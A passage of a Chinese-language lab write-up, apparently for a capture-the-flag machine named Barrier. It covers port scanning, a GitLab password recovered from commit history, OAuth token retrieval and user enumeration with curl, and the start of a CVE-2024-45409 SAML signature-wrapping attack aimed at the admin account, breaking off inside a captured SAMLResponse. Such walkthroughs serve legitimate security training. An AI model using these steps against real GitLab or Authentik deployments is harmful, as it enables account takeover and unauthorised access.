## Barrier
```
[★]$ nmap -p- -vvv --min-rate 10000 10.129.234.46
PORT     STATE SERVICE        REASON
22/tcp   open  ssh            syn-ack ttl 63
80/tcp   open  http           syn-ack ttl 62
443/tcp  open  https          syn-ack ttl 62
8080/tcp open  http-proxy     syn-ack ttl 63
9000/tcp open  cslistener     syn-ack ttl 62
9443/tcp open  tungsten-https syn-ack ttl 62
```

<details>
<summary>Nmap</summary>

```
[★]$ nmap -p 22,80,443,8080,9000,9443 -sCV 10.129.234.46
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-27 01:57 CDT
Nmap scan report for 10.129.234.46
Host is up (0.0091s latency).

PORT     STATE SERVICE             VERSION
22/tcp   open  ssh                 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  3072 f3:6c:aa:fe:2c:20:f6:55:a0:5b:61:54:cf:39:17:d0 (RSA)
80/tcp   open  http                nginx
|_http-title: Did not follow redirect to https://gitlab.barrier.vl:443/
443/tcp  open  ssl/http            nginx
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=gitlab.barrier.vl/organizationName=Mycompany/stateOrProvinceName=Some-State/countryName=AU
| Subject Alternative Name: DNS:gitlab.barrier.vl
| Not valid before: 2026-01-28T11:21:55
|_Not valid after:  2126-01-04T11:21:55
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was https://10.129.234.46/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 58 disallowed entries (15 shown)
| / /autocomplete/users /autocomplete/projects /search 
| /admin /profile /dashboard /users /api/v* /help /s/ /-/profile 
|_/-/user_settings/profile /-/ide/ /-/experiment
8080/tcp open  http                Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
9000/tcp open  cslistener?
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Length: 0
|     Content-Type: text/html; charset=utf-8
|     Date: Fri, 27 Mar 2026 06:57:34 GMT
|     Location: /flows/-/default/authentication/?next=/
|     Referrer-Policy: same-origin
|     Vary: Accept-Encoding
|     Vary: Cookie
|     X-Authentik-Id: d172472750544afd88d5a610fdb69de7
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     X-Powered-By: authentik
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Content-Length: 0
|     Content-Type: text/html; charset=utf-8
|     Date: Fri, 27 Mar 2026 06:57:34 GMT
|     Location: /flows/-/default/authentication/?next=/
|     Referrer-Policy: same-origin
|     Vary: Accept-Encoding
|     Vary: Cookie
|     X-Authentik-Id: 8a82fc32bf484167a1a24779ddacf494
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|_    X-Powered-By: authentik
9443/tcp open  ssl/tungsten-https?
| ssl-cert: Subject: commonName=authentik default certificate/organizationName=authentik
| Subject Alternative Name: DNS:*
| Not valid before: 2026-03-27T06:47:56
|_Not valid after:  2027-03-27T06:47:56
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Length: 0
|     Content-Type: text/html; charset=utf-8
|     Date: Fri, 27 Mar 2026 06:57:36 GMT
|     Location: /flows/-/default/authentication/?next=/
|     Referrer-Policy: same-origin
|     Vary: Accept-Encoding
|     Vary: Cookie
|     X-Authentik-Id: 651632576ad64bf5919474ba481c756f
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     X-Powered-By: authentik
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Content-Length: 0
|     Content-Type: text/html; charset=utf-8
|     Date: Fri, 27 Mar 2026 06:57:37 GMT
|     Location: /flows/-/default/authentication/?next=/
|     Referrer-Policy: same-origin
|     Vary: Accept-Encoding
|     Vary: Cookie
|     X-Authentik-Id: 43875d4e797644708cd824977962cf81
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|_    X-Powered-By: authentik
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9000-TCP:V=7.94SVN%I=7%D=3/27%Time=69C62A5E%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,16F,"HTTP/1\.0\x20302\x20Found\r\nContent-L
SF:ength:\x200\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nDate:\x2
SF:0Fri,\x2027\x20Mar\x202026\x2006:57:34\x20GMT\r\nLocation:\x20/flows/-/
SF:default/authentication/\?next=/\r\nReferrer-Policy:\x20same-origin\r\nV
SF:ary:\x20Accept-Encoding\r\nVary:\x20Cookie\r\nX-Authentik-Id:\x20d17247
SF:2750544afd88d5a610fdb69de7\r\nX-Content-Type-Options:\x20nosniff\r\nX-F
SF:rame-Options:\x20DENY\r\nX-Powered-By:\x20authentik\r\n\r\n")%r(HTTPOpt
SF:ions,16F,"HTTP/1\.0\x20302\x20Found\r\nContent-Length:\x200\r\nContent-
SF:Type:\x20text/html;\x20charset=utf-8\r\nDate:\x20Fri,\x2027\x20Mar\x202
SF:026\x2006:57:34\x20GMT\r\nLocation:\x20/flows/-/default/authentication/
SF:\?next=/\r\nReferrer-Policy:\x20same-origin\r\nVary:\x20Accept-Encoding
SF:\r\nVary:\x20Cookie\r\nX-Authentik-Id:\x208a82fc32bf484167a1a24779ddacf
SF:494\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20DENY\r
SF:\nX-Powered-By:\x20authentik\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r
SF:\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSess
SF:ionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close
SF:\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9443-TCP:V=7.94SVN%T=SSL%I=7%D=3/27%Time=69C62A61%P=x86_64-pc-linux
SF:-gnu%r(GetRequest,16F,"HTTP/1\.0\x20302\x20Found\r\nContent-Length:\x20
SF:0\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nDate:\x20Fri,\x202
SF:7\x20Mar\x202026\x2006:57:36\x20GMT\r\nLocation:\x20/flows/-/default/au
SF:thentication/\?next=/\r\nReferrer-Policy:\x20same-origin\r\nVary:\x20Ac
SF:cept-Encoding\r\nVary:\x20Cookie\r\nX-Authentik-Id:\x20651632576ad64bf5
SF:919474ba481c756f\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Optio
SF:ns:\x20DENY\r\nX-Powered-By:\x20authentik\r\n\r\n")%r(GenericLines,67,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(H
SF:TTPOptions,16F,"HTTP/1\.0\x20302\x20Found\r\nContent-Length:\x200\r\nCo
SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nDate:\x20Fri,\x2027\x20Ma
SF:r\x202026\x2006:57:37\x20GMT\r\nLocation:\x20/flows/-/default/authentic
SF:ation/\?next=/\r\nReferrer-Policy:\x20same-origin\r\nVary:\x20Accept-En
SF:coding\r\nVary:\x20Cookie\r\nX-Authentik-Id:\x2043875d4e797644708cd8249
SF:77962cf81\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20
SF:DENY\r\nX-Powered-By:\x20authentik\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.
SF:1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=u
SF:tf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(S
SF:SLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
SF:\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\
SF:r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"H
SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20ch
SF:arset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
</details>

#### 加入域名
```
[★]$ echo '10.129.234.46 barrier.vl gitlab.barrier.vl' | sudo tee -a /etc/hosts
10.129.234.46 barrier.vl gitlab.barrier.vl
```
OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
#### 关键词搜索：'openssh 3ubuntu0.13 jammy' , 'Ubuntu package openssh 8.9'
#### 根据OpenSSH 版本判断，主机很可能运行的是 Ubuntu 22.04 jammy LTS（或者可能是 22.10 kinetic）
#### 端口 22 和 8080 的 TTL 值显示为 63，这是距离仅一跳的 Linux 系统的预期 TTL 值：
```
[★]$ sudo lft 10.129.234.46:22
traceroute to 10.129.234.46 (10.129.234.46), 30 hops max, 60 byte packets
 1  10.10.14.1 (10.10.14.1)  8.465 ms  8.258 ms
 2  barrier.vl (10.129.234.46)  8.604 ms  8.638 ms
[★]$ sudo lft 10.129.234.46:8080
traceroute to 10.129.234.46 (10.129.234.46), 30 hops max, 60 byte packets
 1  10.10.14.1 (10.10.14.1)  8.392 ms  8.412 ms
 2  barrier.vl (10.129.234.46)  9.141 ms  8.816 ms
```
#### 其他四个端口还需要一次跃点才能到达：
```
[★]$ sudo lft 10.129.234.46:80
traceroute to 10.129.234.46 (10.129.234.46), 30 hops max, 60 byte packets
 1  10.10.14.1 (10.10.14.1)  8.459 ms  8.349 ms
 2  barrier.vl (10.129.234.46)  8.776 ms  9.688 ms
 3  barrier.vl (10.129.234.46)  8.877 ms  8.806 ms
[★]$ sudo lft 10.129.234.46:443
traceroute to 10.129.234.46 (10.129.234.46), 30 hops max, 60 byte packets
 1  10.10.14.1 (10.10.14.1)  8.467 ms  8.471 ms
 2  barrier.vl (10.129.234.46)  8.750 ms  8.955 ms
 3  barrier.vl (10.129.234.46)  9.092 ms  8.701 ms
[★]$ sudo lft 10.129.234.46:9000
traceroute to 10.129.234.46 (10.129.234.46), 30 hops max, 60 byte packets
 1  10.10.14.1 (10.10.14.1)  8.511 ms  8.385 ms
 2  barrier.vl (10.129.234.46)  8.808 ms  8.865 ms
 3  barrier.vl (10.129.234.46)  9.019 ms  8.872 ms
[★]$ sudo lft 10.129.234.46:9443
traceroute to 10.129.234.46 (10.129.234.46), 30 hops max, 60 byte packets
 1  10.10.14.1 (10.10.14.1)  8.250 ms  8.254 ms
 2  barrier.vl (10.129.234.46)  8.730 ms  8.911 ms
 3  barrier.vl (10.129.234.46)  8.881 ms  9.138 ms
```
#### 这表明它们正在一个或多个容器中运行
#### 通过访问浏览器 端口 9000 和 9443 都显示引用Authentik 的标头
#### 80端口左下角'Explore',可以看到一个公共仓库,有一个gitconnect.py
<details>
<summary>gitconnect.py</summary>

```
import requests
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_gitlab_repos():
    base_url = 'https://gitlab.barrier.vl'
    api_url = urljoin(base_url, '/api/v4/')
    
    auth_data = {
        'grant_type': 'password',
        'username': 'satoru',
        'password': '***'
    }
    
    try:
        session = requests.Session()
        session.verify = False
        
        response = session.post(urljoin(base_url, '/oauth/token'), data=auth_data)
        response.raise_for_status()
        
        token = response.json()['access_token']
        headers = {'Authorization': f'Bearer {token}'}
        
        projects_response = session.get(urljoin(api_url, 'projects'), headers=headers)
        projects_response.raise_for_status()
        
        projects = projects_response.json()
        
        print("Available repositories:")
        for project in projects:
            print(f"\nName: {project['name']}")
            print(f"Description: {project.get('description', 'No description available')}")
            print(f"URL: {project['web_url']}")
            print(f"Last activity: {project['last_activity_at']}")
            print("-" * 50)
            
    except requests.exceptions.RequestException as e:
        print(f"Error occurred: {str(e)}")
        if hasattr(e.response, 'text'):
            print(f"Response text: {e.response.text}")
    finally:
        session.close()

if __name__ == "__main__":
    get_gitlab_repos()
```
</details>

#### 看之前提交中该文件的更改，可以找到密码
```
    auth_data = {
          'grant_type': 'password',
          'username': 'satoru',
          'password': 'dGJ2V72SUEMsM3Ca'
    }
```
#### 这些凭证可以正常登录。目前还没有新的仓库，但我可以创建仓库。我没有看到任何可用的运行器
```
[★]$ curl -k -I https://barrier.vl
HTTP/2 302 
server: nginx
date: Fri, 27 Mar 2026 07:39:15 GMT
content-type: text/html; charset=utf-8
content-length: 0
location: https://barrier.vl/users/sign_in
cache-control: no-cache
content-security-policy: 
permissions-policy: interest-cohort=()
x-content-type-options: nosniff
x-download-options: noopen
x-frame-options: SAMEORIGIN
x-gitlab-meta: {"correlation_id":"01KMQ3QAQAMJBAFEZZ1ZFHH85E","version":"1"}
x-permitted-cross-domain-policies: none
x-request-id: 01KMQ3QAQAMJBAFEZZ1ZFHH85E
x-runtime: 0.032424
x-ua-compatible: IE=edge
x-xss-protection: 1; mode=block
strict-transport-security: max-age=63072000
referrer-policy: strict-origin-when-cross-origin
```
#### 在网站上点击'Help'查看源代码，搜索'version' 看到17.3.2
![图片](images/2026032701.png)
### Tomcat - TCP 8080
https://tomcat.apache.org/
#### 端口 8080 上的站点是Apache Tomcat 的默认页面：
![图片](images/2026032702.png)
#### /manager这里通常是管理员页面所在的地方，但是它会弹出身份验证提示，而 Satoru 凭据不起作用
```
[★]$ curl -I http://10.129.234.46:8080
HTTP/1.1 200 
Accept-Ranges: bytes
ETag: W/"1895-1734881225489"
Last-Modified: Sun, 22 Dec 2024 15:27:05 GMT
Content-Type: text/html
Content-Length: 1895
Date: Fri, 27 Mar 2026 07:54:04 GMT
```
#### 404 页面是Tomcat 的默认 404页面
![图片](images/2026032703.png)
#### 目录暴力破解
<details>
<summary>[★]$ feroxbuster -u http://barrier.vl:8080</summary>

```
[★]$ feroxbuster -u http://barrier.vl:8080
                                                                
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://barrier.vl:8080
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l       69w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
401      GET       63l      291w     2499c http://barrier.vl:8080/manager/html
401      GET       54l      241w     2044c http://barrier.vl:8080/host-manager/html
302      GET        0l        0w        0c http://barrier.vl:8080/manager => http://barrier.vl:8080/manager/
404      GET        1l       62w      691c http://barrier.vl:8080/WEB-INF
302      GET        0l        0w        0c http://barrier.vl:8080/host-manager/ => http://barrier.vl:8080/host-manager/html
302      GET        0l        0w        0c http://barrier.vl:8080/manager/ => http://barrier.vl:8080/manager/html
200      GET       29l      211w     1895c http://barrier.vl:8080/
404      GET        1l       62w      691c http://barrier.vl:8080/META-INF
404      GET       44l      184w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://barrier.vl:8080/manager/images => http://barrier.vl:8080/manager/images/
302      GET        0l        0w        0c http://barrier.vl:8080/manager/css => http://barrier.vl:8080/manager/css/
```
</details>

#### 没什么其他特别有趣的事
### Authentik - TCP 9000 / 9443
#### Authentik是一款开源的身份提供商 (IdP) 和单点登录 (SSO) 解决方案，SSO = Single Sign-On（单点登录）
#### 它支持 SAML、OAuth2、OpenID Connect 和 LDAP 等协议，使组织能够集中管理跨多个应用程序的身份验证，并作为 GitLab、Grafana、Nextcloud 等服务的统一登录门户。它采用自托管模式，通常通过 Docker 进行部署。
#### 查看gitlab的官方页面的版本17.3.2
https://about.gitlab.com/releases/categories/releases/
#### 它的补丁版本是17.3.3 
https://about.gitlab.com/releases/2024/09/17/patch-release-gitlab-17-3-3-released/
![图片](images/2026032704.png)
#### SAML身份验证绕过 SAML authentication bypass	Critical
#### 更新依赖项omniauth-saml至 2.2.1 版本和ruby-saml1.17.0 版本，以缓解CVE-2024-45409 漏洞。此安全漏洞仅适用于已配置基于 SAML 身份验证的实例
https://nvd.nist.gov/vuln/detail/CVE-2024-45409
#### Ruby SAML 库用于实现 SAML 授权的客户端。Ruby-SAML 12.2 及更早版本以及 1.13.0 至 1.16.0 版本中的版本无法正确验证 SAML 响应的签名。因此，未经身份验证的攻击者如果能够访问任何已签名的 SAML 文档（由身份提供商 (IdP) 签名），就可以伪造包含任意内容的 SAML 响应/断言。这将允许攻击者以任意用户身份登录到存在漏洞的系统中。此漏洞已在 1.17.0 和 1.12.3 版本中修复
### 枚举 GitLab 用户
#### 为了确定要以哪个用户身份登录，我需要知道可用的用户名。我需要一个 API 令牌，可以通过访问“首选项”页面（点击已登录用户的图标），然后点击“access tokens”来获取。在那里，我将点击“Add new token”，并为其授予所有权限范围：
![图片](images/2026032705.png)
#### Copy token:
#### 也可以使用命令获取token,获得了token_type
```
[★]$ curl -sk https://gitlab.barrier.vl/oauth/token -d "grant_type=password&username=satoru&password=dGJ2V72SUEMsM3Ca"
{"access_token":"d32c77f49ee9fb2356f6e98c1fc5f4cf9c1d0b64277716f80bbd43bf42311abd","token_type":"Bearer","expires_in":7200,"refresh_token":"5c98a818440e08c8cb7c139eb1c373c3e9e918eefe5a7a6024b51160952a1c20","scope":"api","created_at":1774775539}
```
#### 用作Bearer列出用户的令牌
```
[★]$ curl -sk --header "Authorization: Bearer glpat-***********" "https://gitlab.barrier.vl/api/v4/users?per_page=100" | jq .
[
  {
    "id": 5,
    "username": "ghost",
    "name": "Ghost User",
    "state": "active",
    "locked": false,
    "avatar_url": "https://secure.gravatar.com/avatar/79783106d88279c6c8f94f1f4dec22bdb9f90a8d14c9d6c6628a11430e236cbf?s=80&d=identicon",
    "web_url": "https://gitlab.barrier.vl/ghost"
  },
  {
    "id": 4,
    "username": "project_1_bot_9658594231602f87fbf2548e67d1c270",
    "name": "syareya",
    "state": "active",
    "locked": false,
    "avatar_url": "https://secure.gravatar.com/avatar/b41665efb35dfb04e28a21a1bde27f3aef1b3e7c8ed4ad241fdb80cdb620896b?s=80&d=identicon",
    "web_url": "https://gitlab.barrier.vl/project_1_bot_9658594231602f87fbf2548e67d1c270"
  },
  {
    "id": 2,
    "username": "satoru",
    "name": "satoru",
    "state": "active",
    "locked": false,
    "avatar_url": "https://secure.gravatar.com/avatar/f76962cdfb535a817fc9ff0e8fe34e28e92ba91df930af41f610fe8288e89a17?s=80&d=identicon",
    "web_url": "https://gitlab.barrier.vl/satoru"
  },
  {
    "id": 1,
    "username": "akadmin",
    "name": "akadmin",
    "state": "active",
    "locked": false,
    "avatar_url": "https://secure.gravatar.com/avatar/818e54f1cbac56d3843c45d092853330b4d2cb8a6a7feed4703d3019a6993314?s=80&d=identicon",
    "web_url": "https://gitlab.barrier.vl/akadmin"
  }
]
```
#### 使用 Satoru 凭据登录成功，显示两个应用程序 'satoru','dGJ2V72SUEMsM3Ca'
#### akadmin 是Authentik 使用的默认管理员名称！
### 利用 CVE-2024-45409 漏洞
https://github.com/synacktiv/CVE-2024-45409

#### 成功构造了一个 SAML 伪造响应（signature wrapping 攻击），保留合法签名

![图片](images/2026033007.png)
#### 如果我们回顾一下 Gitlab 登录页面，会有一个选项可以输入凭证或者使用单点登录。此外，由于我们已经通过 Authentik 进行了身份验证，点击仪表板上的应用程序会执行单点登录流程，以让我们对这些应用程序进行身份验证。如果我们拦截 Gitlab 的单点登录过程，也就是 SAML 身份验证过程，我们就能获取一个可见的 SAML 令牌，对其进行解码，然后对其进行修改，以尝试以另一个用户的身份获取访问权限。在这种情况下我们将尝试获取管理员账户（akadmin）的访问权限。
#### 首先，我们使用 BurpSuite 来拦截 SSO 过程。在 Authentik 控制面板中点击 Gitlab 应用程序，并按照提示操作，直到我们以 satoru 的身份成功登录到 Gitlab 
![图片](images/2026033006.png)
<details>
<summary>Burpsuite GET /users/auth/saml/callback?SAMLResponse</summary>

```
GET /users/auth/saml/callback?SAMLResponse=nVjZkpvKsn3nKxy9HxU289Sx7bgMQiAxowF4ucFQDGIUgwT6%2BoO63d5ub9vH90Z0hLqSzKyVWZlVtervPqjK9tkGfdvUPfgwVWXdP78IPz%2BNXf3cBH3eP9dBBfrnIXp2OE19xj4hz23XDE3UlE%2FfmfzeIuh70A15U7%2BZxP3np2wY2mcYvt1un274p6ZLYQxBEBhh4UUn7vP0rzftKv69%2BwoMQRwMwZv%2BBOroF%2F5RGCEe%2FheNxf0RdP2C6vPT4uXpg9L3I1DqfgjqYREhGPURwT%2FiyB7FnjHsGSH8pw8i6Ie8DoYXq8cM%2FTJFmg9lEH4Kg67LQffpWsLjEm8PB%2BOQwY%2FswFFQlmEQFcsk4uen%2F0XZAGBBTOAEHRFhEoY0EyEUSYQMTgQ4xT59%2Bfth9vyCqPvy8APqIS%2F%2Bhr8X%2F%2F26gM4QDGP%2FfiQ0MfhwDMoR%2FD5z%2FYv2szNGEej7J%2FjL6wzvnT5zb8v3Y8IesVAsi4UxQ0YxBggcQ1kSpVCUAjhAWJYiyD%2FK65%2FFGy9I83TJ%2FtiBL9DbEMRKnTSvYyGomzpfsp3fX9ZIA0PWxB%2B4Mm26fMiqX1YFijyq4iOYoo8RStR%2FLamA3s33x55e6%2BtRvx%2BrpgN%2FdX3wsc8CjKTefNogAd1SgODDwVY%2BP%2F3131P4arfvgrpPmq7qfxj%2FV1TvugrUV1A2LYg%2F9m%2FBvSH7c4%2B%2FyBj8E5hini5N83%2FM36M%2F32ft1c1LTX9JFHY1zhJRADQHOtKOdXg%2BUykS86xJFPFU%2BjRlUn7VXLnPL5i%2BN35F%2BW0Rvo5%2FrKRvC%2F9qlOmRTRjbI76NzDSz2yFXJCK%2FNp4WCVwgeSZA3BOJ7gTErvT9Pj73J2%2FUdrTc7PZpk64gcFkp9Lilj9ElFLZ9sbHWnXxuMeoC6Cgax9DoZpEqZzz2jBnLuIthOYiCMzcnxoljG0KYeoNXpzuYEMdiu8bcq4Srcb7J2dUmWaVN5tMmc1eK2jtJxAxvnAa7rDvfYHIPYTWlgsSVDpfzQfZ2CAW6M7AMnGnvvluUw5hjF353PV5JRz6drMPlMmsbtCcNc6f4k4mzrIjW0Cowc9WU8nYr4sZtZax9KpFqI%2B3OjuinLnstRSDLYhPfsG2AE5hK8ZMgT1R9YPPLJthCPr8XW70%2BOxy2HuFraeeJmrNlug7n0DvuCt4K9uvmZKLnYiIum%2BlwVy6XnZeOPl%2FLmldAMbo%2FsQzL77qdkPGk6lSnlRlVO%2FbEufadaBx6VqNZY6iNifWUz3gxReNii2unUpExQYdMkb2KB3AcENAcC0kPszOtHK3a7fUtEivUOhR2uUzp4oxJaO9V3dZ3BYmhydXcXAqShQQ5cxb7friQYWW2F1lqzXaLHK%2BqOAhVqF5J9qDgyi4cpInM4pVwKbeZyxE8KyTuPCoQPKTR3jbn9R2WPTzfngq0p7Pe2mVd5Lf8dlrlSt0Yx6t8cMScwpNSoW7d7I1KH1wPWg3dK0WMxk3QMzy%2FzzrZNDAicm8p7Zs%2BXa2VWJBvKckqvFN8%2FlbZ31XyS3XvwPxPqbskworL8fnPSHhs98myjw7gi6Yo0uEuCNx9TLmbwnOpYu0Gy2HJu7HPqUMW0kZTNcQgcjqfFpesyDfsDeE5q5c4kQOQZt9um9QTj5Yliryexa7d%2BCcSCU59qp25WReISRMIVOMJV9wriLZXJl1co9o9velo40KLEH0R7r8Jb8fz%2BqIJ6YZDD2vudss894gEm%2BMYb8pOkfQy3HhDhJV1WB0LSFnrZVTbrV%2BVZ8%2B1S81WbmvuBdFO5MrvEU2SyDl8qh95rtcE9NUR9OZpyYWgnH%2BMcy1xnCFwKcM9vgvpbvl%2FAUU4zGaTYBNC81AuzpKI73fyhmcHqUZsBZFA5QdCIkyYfTjdL8JxNZt3fpXcBdRMmIOWKiYTp8CvWly2oA0en9tWzPLzSllV6%2F1VtWLHypiuYOfhoJ1QoKb6%2FqqvZUSR0Wm9XUeVbOzNW%2BToHbgX0Kw0iOGfNrzUMscSTzd3NQLbsY2DkZUOXn40NkQLDrFz7jyTmlSdUcwGpXYZujozk7iCzj6jX5bGhDc2jVRJap4vjoGuOeHcyvP5nvXduCPweD9HYjhdjMZD8dbu1lNDH1ivXBvQXeraAZgY2svqPUaKFYMI5gX2zVPp9kqQbFFma0gr6ySIzA6WpSoUWjbPYry1HP9SBBAiT9jdluaJ5ze3oTldDfVUrC6rMPTU2PVyxzXkwJ8nJjQlFj9gF%2FMgIvt4pQCrZcZ6gpyuG09HGlFJfujRfKYiq2KucILaEmwhg2W2qcMFGzibIic1OGJSb7xrozPY1MnJxG%2FQcdx3jsIdjHCuVumWJ9KNLJnVJq5n9jRkmuWAMJz5jXSW%2Bai8jCduT%2BxTeu9sUox0lg1MamDXky2iWu3DVuFo2%2BvPHeCKMyUbXKAxaT%2B69EVWY52%2B4cSGLAngXnMTqSWz2eLuFfIFNqP0SRivl0BeJ%2FyKXUUAK%2FNxzXiSx4XNaat6kdZFK14c98hmIG2zZ6TDQUivh5XZQkYu8sagWtWJvbuCRTpqGJsHnKvXWrCde4FbOoML9KMmabeDtfSIjdicJcP8OrrZ3laEjMPWjYpsF0h8qdX22sG3eoQQ8%2BFebi3UbjWprR3EtpxjFhzQVjyepsZzyLt%2FmirV1VvIx8jSF8g6XLbYeJOV4dKZwUy24f0nG8hLY625rs8UF0lA2YMS2jMinYOpjptVj9FYgCzFC2e%2BdaDOhlnc8lnDUnLXTfzufjL4fTHiU1lI8AWkYxEdmwJarT3dHb3RnhXWkJK9fx9FvdaK7TxPMXO8ZbeB1Le2evC2pTu23NXsioTaF0klbMvNnECeea%2Bq2IxdWZCG7VTN28ZAkFFV5hWCS1dzzaFGfhPymAmsSOJgdCT5vRPgO59vKF4SICvTVXg1uc2q0e5o5O%2FWHZMJGJMfJueqJhY3uNZg1mzaouRVLWk%2FaUxBstUUX4votWmh%2BMzVJzkSemS7tFppDGzsOeflIF8rd73Y5hpppABjjIj3PMcNETB65fm%2BD6e72ZC7gYYyQd7e9cRd1rJUpbybBUPlsbVf4ZQijLx6DP2cs2c5ZIzCtqplj9%2FC4%2FU0OpHs1qqBQO3eSdheRp1K9DbnAodN8VzI8paLA8nC0JHj60Q5ldVZIvpxXx0VLeyGgzFktR23LpxAYiqGsEeS6FlNXBnzaNhwlztYdoMD%2BcqOxF6i9t6l1W%2BxNmzOwopV1vSq3VG7WwHvkJGGDpprxLx38ojwKrWZcRLRPpUtL75g3LKJ1evdoVHnEr8VQayfOux4ECpxqwoKSsv41I1QMnYoXdAD2urXQ3A%2BAPfCd5c0US%2FHxDHSIrGztZNfjkf%2F6pHLXYoUrPOdjZTTjMX4JI7QpuZgsioMGPNEHYd1gJBunay0I79i6vH2%2BfVq%2BeOJ%2Bo%2F066kLvzuR353ZX4mRM4ZnEA1fR%2FrC4xTxg7TcsYPh1wQP%2FYS%2BSPL4Y%2FKi%2BjzWfQuiBQeIn770wdB04